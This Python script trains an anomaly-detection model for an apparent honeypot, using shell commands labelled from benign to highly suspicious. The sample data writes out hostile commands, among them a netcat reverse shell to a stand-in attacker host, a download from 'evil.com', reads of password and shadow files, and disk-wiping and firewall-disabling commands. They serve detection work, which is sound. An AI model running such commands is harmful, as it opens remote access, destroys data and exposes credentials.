#!/usr/bin/env python3
"""
ML Model Training Script for AIML Honeypot
Trains IsolationForest model on command data
"""

import os
import sys
import json
import logging
from datetime import datetime

# Add backend to path
sys.path.append('/app')

from ai import AIManager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def load_training_data():
    """Load command data for training"""
    commands_file = "/app/data/commands.json"
    
    if not os.path.exists(commands_file):
        logger.warning("No command data found, creating sample data")
        return create_sample_data()
    
    try:
        with open(commands_file, 'r') as f:
            data = json.load(f)
        
        commands = []
        for item in data:
            if isinstance(item, dict) and 'command' in item:
                commands.append(item['command'])
            elif isinstance(item, str):
                commands.append(item)
        
        logger.info(f"Loaded {len(commands)} commands from training data")
        return commands[:1000]  # Limit to reasonable size
        
    except Exception as e:
        logger.error(f"Error loading training data: {e}")
        return create_sample_data()

def create_sample_data():
    """Create sample training data"""
    sample_commands = [
        # Normal benign commands
        "ls", "ls -la", "pwd", "whoami", "date", "uptime",
        "cat /etc/hostname", "echo hello", "mkdir test",
        "cp file.txt backup.txt", "mv old new", "chmod +x script.sh",
        
        # Somewhat suspicious commands
        "find / -name *.conf", "grep -r password", "ps aux | grep ssh",
        "netstat -tulpn", "cat /proc/version", "uname -a",
        
        # Highly suspicious commands
        "rm -rf /tmp/*", "cat /etc/passwd", "cat /etc/shadow",
        "wget http://evil.com/script.sh", "curl -O malware.bin",
        "nc -e /bin/bash attacker.com 4444", "systemctl stop firewall",
        "passwd root", "su - root", "sudo rm -rf /",
        "chmod 777 /", "kill -9 -1", "dd if=/dev/zero of=/dev/sda",
        "shutdown -h now", "iptables -F", "service ssh stop",
        "cat /etc/ssh/sshd_config", "/bin/bash", "python -c",
    ]
    
    logger.info(f"Created {len(sample_commands)} sample commands")
    return sample_commands

def evaluate_model(ai_manager, test_commands):
    """Evaluate model performance"""
    logger.info("Evaluating model on test commands...")
    
    results = []
    for cmd in test_commands[:20]:  # Test on subset
        analysis = ai_manager.validate_command(cmd)
        results.append({
            "command": cmd,
            "score": analysis["anomaly_score"],
            "level": analysis["threat_level"],
            "patterns": analysis["risk_factors"]
        })
    
    # Print evaluation summary
    threat_levels = {}
    for result in results:
        level = result["level"]
        threat_levels[level] = threat_levels.get(level, 0) + 1
    
    logger.info("Model evaluation results:")
    for level, count in threat_levels.items():
        logger.info(f"  {level}: {count} commands")
    
    return results

async def main():
    """Main training function"""
    logger.info("Starting AIML Honeypot model training...")
    
    # Initialize AI manager
    ai_manager = AIManager()
    
    # Load training data
    training_commands = load_training_data()
    
    if len(training_commands) < 10:
        logger.warning(f"Insufficient training data ({len(training_commands)} commands)")
        logger.info("Using sample data for initial training")
    
    # Train model
    logger.info(f"Training model with {len(training_commands)} commands")
    training_result = await ai_manager.train_model(training_commands)
    
    if training_result["status"] == "success":
        logger.info("✅ Model training completed successfully")
        logger.info(f"Training samples: {training_result['training_samples']}")
        logger.info(f"Features: {training_result['features']}")
        logger.info(f"Contamination: {training_result['contamination']}")
        
        # Evaluate model
        test_commands = [
            "ls -la",  # Normal
            "rm -rf /tmp/*",  # Suspicious
            "cat /etc/passwd",  # High threat
            "echo 'hello world'"  # Normal
        ]
        
        evaluation = evaluate_model(ai_manager, test_commands)
        
        # Get model stats
        stats = ai_manager.get_model_stats()
        logger.info(f"Model status: {stats['status']}")
        
        # Save training report
        report = {
            "training_completed": datetime.now().isoformat(),
            "training_result": training_result,
            "model_stats": stats,
            "evaluation_sample": evaluation[:5],
            "total_training_commands": len(training_commands)
        }
        
        report_file = "/app/models/training_report.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Training report saved to {report_file}")
        logger.info("🎉 Model training pipeline completed successfully!")
        
    else:
        logger.error(f"❌ Model training failed: {training_result}")
        return False
    
    return True

if __name__ == "__main__":
    import asyncio
    try:
        success = asyncio.run(main())
        sys.exit(0 if success else 1)
    except KeyboardInterrupt:
        logger.info("Training interrupted by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Training failed with error: {e}")
        sys.exit(1)



